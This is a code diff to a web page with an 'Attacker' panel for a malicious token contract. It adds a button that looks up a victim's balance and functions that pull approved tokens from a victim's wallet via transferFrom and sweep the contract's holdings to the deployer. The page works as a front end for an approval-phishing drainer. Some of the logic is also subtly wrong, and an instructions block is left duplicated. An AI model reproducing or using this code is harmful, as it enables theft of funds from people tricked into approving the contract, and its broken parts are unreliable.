@@ -94,15 +94,11 @@
 <div id="attackerSection">
     <h2>Attacker: Interact with Malicious Contract</h2>
     <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
-    <span id="attackerStatus"></span> <!-- Add this line -->
+    <span id="attackerStatus"></span> <!-- Add this line to show attacker's wallet status -->
     <button id="checkAllowanceBtn" disabled>Check Allowance</button>
+    <button id="checkBalanceBtn" disabled>Check Victim's Balance</button> <!-- Added check balance button -->
     <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
     <button id="deployerWithdrawBtn" disabled>Deployer Withdraw</button>
-
-    <h3>Instructions for Attacker:</h3>
-    <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
-</div>
-
 
     <h3>Instructions for Attacker:</h3>
     <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
@@ -126,6 +122,7 @@ async function connectAttackerWallet() {
 
         // Enable the attacker's buttons once wallet is connected
         document.getElementById("checkAllowanceBtn").disabled = false;
+        document.getElementById("checkBalanceBtn").disabled = false;
         document.getElementById("transferTokensBtn").disabled = false;
         document.getElementById("deployerWithdrawBtn").disabled = false;
     } else {
@@ -151,18 +148,53 @@ document.getElementById("checkAllowanceBtn").addEventListener("click", async () 
     }
 });
 
-// Withdraw Tokens
+// Check Victim's Balance
+document.getElementById("checkBalanceBtn").addEventListener("click", async () => {
+    const victimAddress = prompt("Enter victim's wallet address:");
+    if (victimAddress) {
+        try {
+            const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+            alert(`Victim's balance: ${balance} tokens.`);
+        } catch (error) {
+            alert("Error while checking balance.");
+            console.error(error);
+        }
+    }
+});
+
+// Withdraw Tokens (from victim's address)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
     const amount = prompt("Enter the amount to withdraw:");
     if (victimAddress && amount) {
         try {
+            // Make sure the victim has approved the malicious contract
             await contract.methods.transferFrom(victimAddress, accounts[0], amount).send({ from: accounts[0] });
-            alert(`${amount} tokens withdrawn.`);
+            alert(`${amount} tokens withdrawn from the victim's account!`);
         } catch (error) {
             alert("Error during withdrawal.");
             console.error(error);
         }
     }
 });
+
+// Deployer Withdraw (withdraw from the malicious contract balance)
+document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
+    const deployerAddress = accounts[0];
+    try {
+        const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
+        if (contractBalance > 0) {
+            await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
+            alert(`All tokens withdrawn to the deployer's address!`);
+        } else {
+            alert("No tokens available in the malicious contract.");
+        }
+    } catch (error) {
+        alert("Error while withdrawing tokens.");
+        console.error(error);
+    }
+});
 </script>
+</body>
+
+</html>
